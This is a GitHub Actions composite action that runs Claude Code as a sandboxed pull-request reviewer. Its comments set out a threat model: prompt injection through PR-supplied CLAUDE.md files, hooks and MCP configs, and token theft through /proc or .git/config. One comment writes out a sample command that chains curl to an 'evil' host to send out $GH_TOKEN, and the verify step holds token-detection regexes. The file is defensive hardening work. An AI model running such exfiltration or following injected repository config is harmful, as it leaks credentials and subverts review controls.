name: ai_review_engine_anthropic
description: >
  AI PR review engine — Claude Code Action. Reads a pre-built review context and
  a pre-fetched PR diff, reviews the checked-out code, and writes the review
  markdown to a file. The model is granted no shell tool, and is instructed not
  to comment; the calling workflow owns comment posting. See the note on
  github_token below for what this engine does and does not enforce.

# ENGINE CONTRACT (see .github/workflows/AI_PR_REVIEW_README.md)
#
# The caller guarantees: PR head is checked out; review_context_path and
# pr_diff_path exist and are non-empty; the access gate has passed.
#
# This engine must: strip PR-supplied agent config FIRST, grant the model no
# shell tool, write the review to output_path, and fail with an engine-named
# message if it wrote nothing. It must not post PR comments or reach the GitHub
# API on the model's behalf.
#
# Composite-action gotchas that constrain this file:
#   - `secrets` is not readable here, so api_key arrives as an input.
#     `github.token` IS reachable (precedent: post_preview_build_comment).
#   - `timeout-minutes` is invalid on the steps below; the caller's dispatch
#     step carries it.
#   - `uses:` takes no expressions, so the claude-code-action SHA is pinned
#     literally below and bumped by PR. This is the same governance as the Kimi
#     engine's `cli_version` input, enforced by a different mechanism.

inputs:
  review_context_path:
    description: "Path to the pre-built review context markdown (instructions, PR metadata, previous review, acknowledged suggestions, required output format). Built by the caller."
    required: false
    default: "/tmp/review_context.md"
  pr_diff_path:
    description: "Path to the pre-fetched PR diff. Fetched by the caller with the trusted token so this engine needs no shell tool."
    required: false
    default: "/tmp/pr_diff.txt"
  output_path:
    description: "Path this engine MUST write the final review markdown to."
    required: false
    default: "/tmp/ai_review_output.txt"
  repository:
    description: "owner/repo of the PR under review (prompt preamble only)."
    required: true
  pr_number:
    description: "Number of the PR under review (prompt preamble only)."
    required: true
  model:
    description: "Claude model ID, e.g. claude-sonnet-5. Passed via claude_args --model (the action's `model` input was removed upstream)."
    required: false
    default: "claude-sonnet-5"
  base_url:
    description: "LLM API base URL. A trailing /v1 is REMOVED before use — the Anthropic SDK appends /v1/messages itself. Accepting it and stripping means one caller-facing value works for every engine, so flipping `engine` never silently 404s."
    required: false
    default: "https://litellmsa.deriv.ai/v1"
  api_key:
    description: "API key for base_url (a LiteLLM virtual key with the default base_url). Composite actions cannot read the `secrets` context, so the caller must pass this explicitly."
    required: true

outputs:
  output_path:
    description: "Path the review markdown was written to."
    value: ${{ steps.verify.outputs.output_path }}

runs:
  using: composite
  steps:
    # Security boundary, not hygiene — and broader than the file this engine was
    # extracted from, which stripped only CLAUDE.md. Claude Code reads CLAUDE.md,
    # CLAUDE.local.md and AGENTS.md as instructions; .claude/settings.json can
    # declare HOOKS that execute arbitrary commands; .mcp.json can declare MCP
    # servers; .claude-plugin is a plugin manifest. None of those are gated by
    # the --allowedTools allowlist below, and all of them are PR-controlled.
    # These paths are engine-specific: another engine must revisit this list.
    - name: Strip PR-supplied agent config (Claude Code)
      shell: bash
      working-directory: ${{ github.workspace }}
      run: |
        # Recursive, not root-only. Per Claude Code's memory docs: "Claude also
        # discovers CLAUDE.md and CLAUDE.local.md files in subdirectories under
        # your current working directory... they are included when Claude reads
        # files in those subdirectories." Nested .claude/rules/*.md load the same
        # way (path-scoped rules trigger when a matching file is read). This
        # review's prompt tells the model to traverse into dependencies, so a
        # nested packages/foo/CLAUDE.md would reach it as trusted instructions
        # even with the root file deleted.
        #
        # AGENTS.md is stripped defensively — Claude Code does not read it
        # natively ("Claude Code reads CLAUDE.md, not AGENTS.md") but a CLAUDE.md
        # can @import it, and other engines do read it.
        #
        # .git is pruned so the sweep cannot corrupt the checkout.
        find . -name .git -prune -o \( -type f -o -type l \) \
          \( -name 'CLAUDE.md' -o -name 'CLAUDE.local.md' -o -name 'AGENTS.md' -o -name '.mcp.json' \) \
          -print0 | xargs -0 -r rm -f
        find . -name .git -prune -o \( -type d -o -type l \) \
          \( -name '.claude' -o -name '.claude-plugin' \) \
          -print0 | xargs -0 -r rm -rf
        echo "✅ Stripped PR-supplied agent config (recursive)"

        # Persistent self-hosted runner: clear cross-run agent state too.
        rm -rf "$HOME/.claude"
        rm -f "$HOME/.claude.json"

    - name: Set up Node.js
      # For the PreToolUse path guard below, which is a Node script (JSON and
      # path handling is what goes wrong in shell). Claude Code itself is a
      # native binary and does not need this; the runner is not assumed to have
      # node on PATH. Pinned to a commit SHA, same as the Kimi engine.
      uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
      with:
        node-version: "22"

    - name: Install path guard (Claude Code)
      shell: bash
      working-directory: ${{ github.workspace }}
      env:
        # This composite action's own files on the runner (the
        # deriv-com/shared-actions checkout under _actions), not the PR checkout.
        ACTION_PATH: ${{ github.action_path }}
        GUARD_DIR: ${{ runner.temp }}/ai-review-path-guard
      run: |
        # 1. Path guard. Claude Code's `--allowedTools` has no path scope for
        #    Read, so without this the model can open anything on the runner —
        #    including /proc/self/environ of its own CLI process, which
        #    claude-code-action spawns with the job's GitHub token in its
        #    environment (GITHUB_TOKEN, GH_TOKEN, OVERRIDE_GITHUB_TOKEN and
        #    DEFAULT_WORKFLOW_TOKEN, verified in base-action/src/parse-sdk-
        #    options.ts at the pinned SHA: `env: { ...process.env }`). The guard
        #    is the same script the Kimi engine uses (../ai_review_path_guard,
        #    unit-tested in lint-actions.yml); Claude Code's Read/Write pass the
        #    path as `file_path`, which it accepts. It is registered through the
        #    action's `settings` input below and confines Read/Grep/Glob to the
        #    PR checkout minus .git/ plus the caller's context, diff and output
        #    files, Write to the output file alone, and denies every other tool.
        #    Copied OUTSIDE the PR checkout (the PR controls the checkout) into
        #    a directory wiped first, so a persistent runner cannot carry a
        #    stale copy or a stale decision log into this run. Syntax-checked
        #    here so a broken copy fails this step, not every tool call.
        rm -rf "$GUARD_DIR"
        mkdir -p "$GUARD_DIR"
        cp "$ACTION_PATH/../ai_review_path_guard/path-guard.js" "$GUARD_DIR/path-guard.js"
        node --check "$GUARD_DIR/path-guard.js"

        # 2. Baseline for the verify step: the checkout must arrive with an
        #    origin remote and a credential-free .git/config.
        #
        #    The remote is KEPT on purpose. An earlier revision of this fix
        #    removed it so that claude-code-action's `git remote set-url origin
        #    https://x-access-token:<job token>@...` would have nothing to write
        #    to. That breaks the action: on every PR event, run.ts at the pinned
        #    SHA calls restoreConfigFromBase (src/github/operations/
        #    restore-config.ts), which runs
        #      git fetch origin <base branch> --depth=1 --no-recurse-submodules
        #    with no try/catch around it, then restores .claude/, .mcp.json,
        #    CLAUDE.md, .gitmodules, .husky, ... from origin/<base> — the
        #    maintainer-merged versions, replacing whatever the PR shipped. With
        #    no origin that fetch throws, the action fails before the model
        #    starts, and the caller gets no review at all. Verified against the
        #    source and against production logs of deriv-api-v2's GLM and
        #    DeepSeek reviews (both `engine: anthropic`), which show that fetch
        #    running on every PR. How the token is kept out of .git/config
        #    anyway is explained on the action step below (use_commit_signing
        #    plus env-only fetch credentials). (HackerOne #4037167)
        if ! git remote get-url origin >/dev/null 2>&1; then
          echo "❌ Anthropic engine: the checkout has no origin remote; claude-code-action's base-branch restore fetches through it"
          exit 1
        fi
        if git config --local --get-regexp '^remote\..*\.url$' | grep -q '@' \
           || grep -qiE 'x-access-token|extraheader|includeif|credential\.helper' .git/config; then
          echo "❌ Anthropic engine: .git/config carries credentials before the review step — the caller's checkout must use persist-credentials: false"
          exit 1
        fi
        echo "✅ Anthropic engine: path guard installed at $GUARD_DIR; .git/config is credential-free going in"

    - name: Resolve base URL and verify inputs
      id: resolve
      shell: bash
      env:
        INPUT_BASE_URL: ${{ inputs.base_url }}
        CONTEXT_PATH: ${{ inputs.review_context_path }}
        DIFF_PATH: ${{ inputs.pr_diff_path }}
      run: |
        [[ -s "$CONTEXT_PATH" ]] || { echo "❌ Anthropic engine: missing or empty review context at $CONTEXT_PATH"; exit 1; }
        [[ -s "$DIFF_PATH"    ]] || { echo "❌ Anthropic engine: missing or empty PR diff at $DIFF_PATH"; exit 1; }

        # ANTHROPIC_BASE_URL must NOT carry /v1 — the SDK appends /v1/messages.
        # Emitted as a step OUTPUT rather than via $GITHUB_ENV, because env
        # written inside a composite action leaks into the caller's later steps.
        BASE_URL="${INPUT_BASE_URL%/}"
        BASE_URL="${BASE_URL%/v1}"
        echo "base_url=$BASE_URL" >> "$GITHUB_OUTPUT"
        echo "🔧 Anthropic engine | model=${{ inputs.model }} | base_url=$BASE_URL"

    - name: Claude Code PR review
      # Not a release tag — this is the SHA claude-pr-review.yml was pinned to
      # (2026-05-01, "bump Claude Code to 2.1.126"). Carried over unchanged so the
      # engine behaves identically to the workflow it replaces.
      uses: anthropics/claude-code-action@fefa07e9c665b7320f08c3b525980457f22f58aa
      env:
        ANTHROPIC_BASE_URL: ${{ steps.resolve.outputs.base_url }}
        ANTHROPIC_AUTH_TOKEN: ${{ inputs.api_key }}
        CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"
        CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS: "1"
        DISABLE_NON_ESSENTIAL_MODEL_CALLS: "1"
        # Read by the path guard (hooks inherit the CLI's environment, and the
        # action spawns the CLI with this step's env). GITHUB_WORKSPACE is set by
        # the runner. PATH_GUARD_LOG receives one line per decision and is
        # checked by the verify step: a review with an empty log means the hook
        # never fired. The directory is wiped by the install step above, so no
        # stale log survives on a persistent runner.
        OUTPUT_PATH: ${{ inputs.output_path }}
        CONTEXT_PATH: ${{ inputs.review_context_path }}
        DIFF_PATH: ${{ inputs.pr_diff_path }}
        PATH_GUARD_LOG: ${{ runner.temp }}/ai-review-path-guard/decisions.log
        # Credentials for the action's own `git fetch origin <base>` (the
        # base-branch restore described on the install step), handed to git
        # through its environment-config mechanism (GIT_CONFIG_COUNT/KEY/VALUE,
        # git >= 2.31) so they exist in this step's process environment only
        # and are never written to .git/config. The helper reads the token the
        # action itself places in its process env before that fetch (run.ts:
        # GITHUB_TOKEN/GH_TOKEN from the github_token input); OVERRIDE_GITHUB_TOKEN
        # is the action's own env name for the same input, kept as a fallback.
        # This adds no secret the CLI's environment does not already hold, and
        # the model cannot run git (no Bash) or read /proc (path guard). Without
        # it the fetch of a private repo fails and, that call having no
        # try/catch, the action exits before the model runs. The verify step
        # below fails the job if anything credential-shaped shows up in
        # .git/config anyway.
        GIT_CONFIG_COUNT: "1"
        GIT_CONFIG_KEY_0: credential.helper
        GIT_CONFIG_VALUE_0: '!f() { cat >/dev/null; echo username=x-access-token; echo "password=${GITHUB_TOKEN:-$OVERRIDE_GITHUB_TOKEN}"; }; f'
      with:
        anthropic_api_key: ${{ inputs.api_key }}
        # The one branch of agent mode's prepare (src/modes/agent/index.ts at
        # the pinned SHA) that does NOT call configureGitAuth — the function
        # that runs
        #   git remote set-url origin https://x-access-token:<job token>@github.com/<owner>/<repo>.git
        # and so writes the caller's write-scoped token, in plaintext, into
        # .git/config, undoing persist-credentials: false and putting it within
        # reach of any Read or Grep over the checkout. Removing the origin remote
        # instead is not an option (see the install step). Nothing is signed or
        # committed here: the model has no commit tool. The one side effect is
        # that the action mounts its github_file_ops MCP server
        # (src/mcp/install-mcp-server.ts), whose config — job token included, for
        # that server's env — travels in the CLI's argv; it is denied by name in
        # --disallowedTools below and by the path guard, which allows only
        # Read/Write/Grep/Glob, and argv, like the environment, is reachable only
        # through /proc, which the guard denies. (HackerOne #4037167)
        use_commit_signing: true
        # PreToolUse hook = the path guard installed above. The action merges
        # this JSON into $HOME/.claude/settings.json (base-action/src/
        # setup-claude-code-settings.ts) and the SDK loads that file because
        # settingSources defaults to user+project+local (parse-sdk-options.ts);
        # `--setting-sources user` in claude_args narrows it to that one file so
        # nothing in the PR checkout is read as settings even if the strip step
        # missed a path. Claude Code hook contract: JSON on stdin with tool_name
        # and tool_input; exit 2 blocks the call and shows stderr to the model;
        # any OTHER non-zero exit does not block, hence `|| exit 2` — a guard
        # that cannot start must deny, not wave through. Matcher is match-all
        # (a call the matcher does not fire for is allowed without a decision;
        # the guard denies unknown tools itself). Timeout is seconds; a hook
        # that exceeds it is treated as allow, and the script needs milliseconds.
        settings: |
          {
            "hooks": {
              "PreToolUse": [
                {
                  "matcher": ".*",
                  "hooks": [
                    {
                      "type": "command",
                      "command": "node '${{ runner.temp }}/ai-review-path-guard/path-guard.js' || exit 2",
                      "timeout": 30
                    }
                  ]
                }
              ]
            }
          }
        # Default is empty = no bots. That is why GLM/DeepSeek (this engine)
        # failed red on Forge PRs after the job-level allowlist started them:
        # "Workflow initiated by non-human actor: gh-app-write". Kimi and Grok
        # do not use this action, so they already review those PRs. Exact app
        # slug only — `*` would let Dependabot drive a job that holds the
        # write-scoped token. The action strips a trailing `[bot]` on both
        # sides (src/github/validation/actor.ts at this SHA), so
        # `gh-app-write` matches `github.actor` `gh-app-write[bot]`.
        allowed_bots: gh-app-write
        # The action needs a token for its own actor/permission checks and for
        # the base-branch fetch above.
        #
        # What the model can actually reach here — verified against the action's
        # SOURCE at the pinned SHA, not its docs (the docs' "base GitHub tools
        # are always included" describes tag mode): passing `prompt:` puts the
        # action in AGENT mode, and in agent mode src/mcp/install-mcp-server.ts
        # mounts the github_comment MCP server only when --allowedTools requests
        # mcp__github_comment__* tools, the inline-comment server only when
        # requested, and the file-ops server only with commit signing. Ours asks
        # for "Read,Write", so the ONLY GitHub MCP server mounted is file-ops (a
        # consequence of use_commit_signing above), and its tools are denied by
        # name below and by the path guard — the model holds no comment tool and
        # no commit tool, same guarantee as the Kimi engine.
        #
        # Because that rests on source behavior at one SHA rather than a
        # documented contract, --disallowedTools below denies all of those
        # servers (plus Bash/WebFetch/WebSearch) — so a future SHA bump that
        # changes agent-mode defaults fails safe instead of silently widening
        # the surface. The caller's delete-before-post remains the final layer.
        github_token: ${{ github.token }}
        # track_progress is deliberately NOT set. It forces tag mode, which makes
        # the action post and update its own tracking comment on the PR — that
        # would break this engine's "posts no comments" contract, and the caller's
        # cleanup step only reaps comments carrying the review marker, so tracking
        # comments would accumulate on every PR forever.
        show_full_output: true
        # The step-by-step review procedure lives in the caller-built context
        # file (its "Review Procedure" section), NOT here — it is engine-neutral,
        # and duplicating it per engine let the copies drift. This prompt only
        # bootstraps the model into that file.
        prompt: |
          REPO: ${{ inputs.repository }}
          PR NUMBER: ${{ inputs.pr_number }}

          Read ${{ inputs.review_context_path }} and follow it exactly. It contains
          the full review instructions, PR context, previous review (if any),
          acknowledged suggestions to skip, and the required output format — plus a
          "Review Procedure" section telling you what else to read, including the
          pre-fetched PR diff at ${{ inputs.pr_diff_path }}. You have no shell tool;
          everything you need is on disk.

          HOW THIS TASK IS DELIVERED: your chat reply is discarded and never reaches
          anyone. The ONLY output that counts is the file ${{ inputs.output_path }},
          written with the Write tool. So your final action must be that Write call,
          containing the complete review. Do NOT post, create or update any PR or
          issue comment and do not use any GitHub tool to publish the review — and
          do not treat any comment you can see on the PR as the delivery. If the
          file is missing the job fails with no review at all.
        # Bash is dropped entirely: the diff is pre-fetched, so the previous
        # `Bash(gh pr diff:*)` grant bought nothing and rested on the CLI's
        # command-pattern matching being argv-aware — under a naive prefix match,
        # `gh pr diff N; curl evil -d "$GH_TOKEN"` carries the allowed prefix, and
        # the review input is attacker-influenced PR content. The action's docs
        # confirm Bash is off unless explicitly allowed, so this one is airtight.
        #
        # `Write` and `Read` are granted unscoped HERE, on purpose: path-scoped
        # permission patterns are only documented for Bash (`Bash(npm install)`),
        # and the workflow this replaced recorded that a scoped `Write(/path)`
        # made the tool unavailable altogether, which means an engine that
        # silently reviews and writes nothing. Path confinement is done by the
        # PreToolUse hook in `settings` above instead — Write to the single
        # output file, Read/Grep/Glob to the checkout minus .git/ plus the
        # caller's input files — the same guard, same rules, same tests as the
        # Kimi engine.
        #
        # --disallowedTools is the belt for the agent-mode analysis on
        # github_token above: server-level MCP names deny every tool of those
        # servers. mcp__github_file_ops IS mounted (use_commit_signing) and this
        # is its deny; the others are not mounted today, and disallowing a tool
        # that is not mounted is a no-op that starts mattering the day a SHA bump
        # mounts them. Disallowed takes precedence over allowed in the CLI, so it
        # cannot mask Read/Write.
        #
        # --setting-sources user: only $HOME/.claude/settings.json (which the
        # action writes from `settings` above) is loaded; project and local
        # settings inside the PR checkout are not, whatever the strip step did.
        claude_args: |
          --model ${{ inputs.model }}
          --allowedTools "Read,Write"
          --disallowedTools "Bash,WebFetch,WebSearch,mcp__github_comment,mcp__github_inline_comment,mcp__github_file_ops,mcp__github"
          --setting-sources user

    - name: Verify the sandbox held and the review was written
      id: verify
      shell: bash
      working-directory: ${{ github.workspace }}
      env:
        OUTPUT_PATH: ${{ inputs.output_path }}
        PATH_GUARD_LOG: ${{ runner.temp }}/ai-review-path-guard/decisions.log
      run: |
        # 1. The job token must not have reached .git/config. use_commit_signing
        #    keeps claude-code-action off the code path that runs
        #    `git remote set-url origin https://x-access-token:...`, and the
        #    action's base-branch fetch authenticated from env-only git config;
        #    so the file should be exactly as the caller's persist-credentials:
        #    false checkout left it (the install step asserted that baseline).
        #    This re-reads the file the model's Read or Grep could have reached
        #    and fails if any remote URL carries credentials or any credential
        #    plumbing (a checkout-style extraheader / includeIf, a credential
        #    helper, or a token shape) is present. Raw file, not `git config
        #    --list`, so an include pointing elsewhere is itself visible. A hit
        #    here means the pinned action's behaviour changed: treat the job
        #    token as exposed to the model, rotate/inspect, and do not merge the
        #    SHA bump that did it.
        if [[ -f .git/config ]] && { git config --local --get-regexp '^remote\..*\.url$' 2>/dev/null | grep -q '@' \
             || grep -qiE 'x-access-token|extraheader|includeif|credential\.helper|gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}' .git/config; }; then
          echo "❌ Anthropic engine: .git/config carries credentials after the review step. The model's Read or Grep could have reached it — treat the job token as exposed. (HackerOne #4037167)"
          echo "   claude-code-action at the pinned SHA only rewrites the origin URL with the token outside commit-signing mode, and this engine sets use_commit_signing: true. Check what changed."
          exit 1
        fi

        # 2. The review exists?
        # Fail here, named, rather than letting the caller report a generic
        # "review file missing" — all steps in a composite action share one log
        # group, so an engine-attributed error is what makes this locatable.
        if [[ ! -s "$OUTPUT_PATH" ]]; then
          echo "❌ Anthropic engine: claude-code-action finished but wrote no review to $OUTPUT_PATH"
          exit 1
        fi

        # 3. The path guard actually ran. A review exists, so the model made at
        #    least one tool call (the Write that produced it), so the match-all
        #    PreToolUse hook must have logged at least one decision. An empty or
        #    missing log means the hook never fired — the `settings` plumbing or
        #    the hook contract changed under a SHA bump — and this review was
        #    produced with no path confinement at all, with the job token in
        #    the CLI's environment. It is not handed to the caller. Fail closed;
        #    do not downgrade this to a warning.
        if [[ ! -s "$PATH_GUARD_LOG" ]]; then
          echo "❌ Anthropic engine: the review was written but the path guard never ran (no decisions logged at $PATH_GUARD_LOG)."
          echo "   The PreToolUse hook is the only path control in this engine; without it the model could read anything on the runner, including its own process environment."
          echo "   Refusing to hand this review to the caller. Check the \`settings\` hook against this claude-code-action SHA. (HackerOne #4037167)"
          exit 1
        fi
        echo "✅ Anthropic engine: path guard handled $(wc -l < "$PATH_GUARD_LOG" | tr -d ' ') tool call(s), $(grep -c '^deny' "$PATH_GUARD_LOG" || true) denied; .git/config is credential-free"
        echo "✅ Anthropic engine: review written ($(wc -c < "$OUTPUT_PATH") bytes)"
        echo "output_path=$OUTPUT_PATH" >> "$GITHUB_OUTPUT"
